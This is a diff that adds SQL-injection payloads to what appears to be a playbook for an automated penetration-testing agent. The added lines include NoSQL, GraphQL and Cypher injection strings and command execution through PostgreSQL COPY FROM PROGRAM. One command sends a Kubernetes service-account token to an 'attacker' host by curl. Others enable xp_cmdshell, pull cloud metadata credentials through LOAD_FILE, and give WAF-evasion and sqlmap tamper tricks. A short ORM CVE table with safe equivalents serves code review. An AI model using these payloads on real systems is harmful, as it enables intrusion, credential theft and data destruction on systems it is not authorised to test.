@@ -54,6 +54,18 @@ servers, reporting/exporters.
 - Query builders: `whereRaw` / `orderByRaw`, string templates in ORMs.
 - JSON coercion or array containment operators.
 - Batch/bulk endpoints and report generators that embed filters directly.
+- **GraphQL resolvers** — filter/sort/where args that flow into raw SQL:
+  `{"query":"query{ users(filter: \"' OR 1=1 --\"){ id email }}"}`.
+- **WebSocket message bodies** — `ws.send('{"action":"search","query":"x\\' OR 1=1--"}')`.
+- **REST API filter objects** — `{"filter": {"name": {"$regex": "admin' OR 1=1--"}}, "sort": "name'; DROP TABLE users--"}`.
+- **NoSQL operator injection** — Mongo: `username[$ne]=admin&password[$ne]=`,
+  `username[$regex]=^adm`, `{"$where": "sleep(5000)"}`, `{"username": {"$in": ["admin"]}}`.
+- **Cypher / Neo4j** (CVE-2024-34517): `MATCH (u:User) WHERE u.name = 'admin' OR 1=1 //--' RETURN u`.
+  Neo4j 5.x <5.18 / <4.4.26 also allowed privilege escalation via IMMUTABLE procedures.
+
+**JSON operator probes** (when the column is JSON/JSONB):
+- MySQL: `id=1 AND JSON_EXTRACT('{"a":1}', '$.a')=1`.
+- PostgreSQL: `id=1 AND '{"a":1}'::jsonb ? 'a'`.
 
 ## Detection channels (pick the quietest reliable one)
 
@@ -96,6 +108,9 @@ syntax acceptance.
 - Files: `COPY table TO/FROM '/path'` (superuser), `lo_import` / `lo_export`.
 - JSON / JSONB: operators `->`, `->>`, `@>`, `?|` chained with lateral or
   CTE for blind extraction.
+- RCE via `COPY ... FROM PROGRAM`: `'; CREATE TABLE c(o text); COPY c FROM PROGRAM 'id'; SELECT * FROM c; --`.
+- **K8s service account exfil** when running in-cluster:
+  `'; COPY (SELECT '') TO PROGRAM 'curl http://attacker/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)'; --`.
 
 ### MSSQL
 
@@ -106,6 +121,10 @@ syntax acceptance.
 - Time: `WAITFOR DELAY '0:0:5'`; heavy functions also produce measurable
   delays.
 - Error-based: convert/parse, divide by zero, `FOR XML PATH` leaks.
+- Linked-server pivot: `'; EXEC ('SELECT * FROM OPENROWSET(''SQLOLEDB'',''Server=linked;Trusted_Connection=yes'',''SELECT 1'')') --`.
+- **Azure SQL Managed Instance**: re-enable `xp_cmdshell` then run cloud CLI:
+  `'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --` then
+  `'; EXEC xp_cmdshell 'az vm list'; --`.
 
 ### Oracle
 
@@ -115,6 +134,35 @@ syntax acceptance.
 - Time: `dbms_lock.sleep(n)`.
 - Error-based: `to_number` / `to_date` conversions, `XMLType`.
 - File: `UTL_FILE` with directory objects (privileged).
+
+## Cloud-native attack paths
+
+Modern targets often run in cloud — the DB itself becomes a pivot to the
+metadata service or to managed-platform APIs.
+
+- **AWS IMDSv1** (legacy environments still allow it):
+  `' UNION SELECT LOAD_FILE('http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name') --`.
+- **AWS RDS Proxy disruption**: `'; CALL mysql.rds_kill(CONNECTION_ID()); --`.
+- **Azure instance metadata**:
+  `' UNION SELECT LOAD_FILE('http://169.254.169.254/metadata/instance?api-version=2021-02-01') --`.
+- **GCP Cloud SQL fingerprint**: `' UNION SELECT @@global.version_comment, @@hostname --`.
+- **Lambda / serverless connection-pool poisoning** — `SET ROLE` from one
+  invocation persists when DB connections are reused across invocations.
+  Inject into any `SET ROLE '${userInput}'` to escalate subsequent calls.
+
+## ORM CVE tracking (2023–2025)
+
+Concrete vulnerable patterns to grep for during code review:
+
+| ORM | CVE / Issue | Vulnerable pattern |
+|-----|-------------|--------------------|
+| Sequelize | CVE-2023-22578 | `sequelize.literal(\`name = '${userInput}'\`)` |
+| TypeORM <0.3.12 | findOne injection | `repository.findOne({ where: \`id = ${id}\` })` |
+| Hibernate 6.x | Query cache poisoning | `session.createQuery("FROM User WHERE name = '" + input + "'")` |
+| Prisma <4.11 | Raw query | `prisma.$executeRawUnsafe(\`SELECT * FROM users WHERE id = ${id}\`)` |
+
+Safe equivalents: Sequelize `replacements`, Prisma tagged-template
+`$queryRaw\`... ${user}\``, Knex `whereRaw('name = ?', [user])`.
 
 ## Extraction techniques
 
@@ -170,10 +218,19 @@ syntax acceptance.
 **Keyword splitting**: `UN/**/ION`, `U%4eION`, backticks/quotes, case folding.
 **Numeric tricks**: scientific notation, signed/unsigned, hex
 (`0x61646d696e`).
-**Encodings**: double URL encoding, mixed Unicode normalizations
-(NFKC/NFD), `char()` / `CONCAT_ws` token assembly.
+**Encodings**: double URL encoding (`%2f` → `%252f`), mixed Unicode
+normalizations (NFKC/NFD), `char()` / `CONCAT_ws` token assembly,
+hex literals (`SELECT` → `0x53454C454354` in MySQL contexts that accept it),
+null byte prefix (`%00' UNION SELECT password FROM users--`).
 **Clause relocation**: subselects, derived tables, CTEs (`WITH`), lateral
 joins to hide payload shape.
+**JSON wrapper**: prefix payload with dummy JSON `/**/{"a":1}` to confuse
+WAF parsers that try to validate request bodies.
+**Transport tricks**: replay payloads over HTTP/2 (h2/h2c) — HPACK
+compression can obscure tokens that perimeter WAFs match on the wire.
+**Tamper chaining (sqlmap)**: stack multiple tampers for layered WAFs,
+e.g. `--tamper=space2comment,charencode`. Use Atlas to suggest tamper
+combinations against the specific WAF observed.
 
 ## Workflow
 
@@ -219,7 +276,12 @@ A finding is real only when:
   databases.
 - `sqlmap_dump_table(url, db, table)` — dump a single table for PoC.
 - `bash` — fallback for manual payload injection via `curl`, OAST listener
-  setup, or anything sqlmap doesn't cover.
+  setup, or anything sqlmap doesn't cover. Useful adjuncts:
+  - `ghauri -u "<url>?id=1" --dbs` — often faster than sqlmap on time-based
+    blind targets.
+  - `hakrawler -url <target> | tee crawl && arjun -i crawl -oJ params.json` —
+    hidden parameter discovery before injection probing.
+  - `gf sqli <urls>` to filter wayback/crawl output for likely sinks.
 
 ## Rules
 - Test EVERY parameter you can find, not just obvious ones.
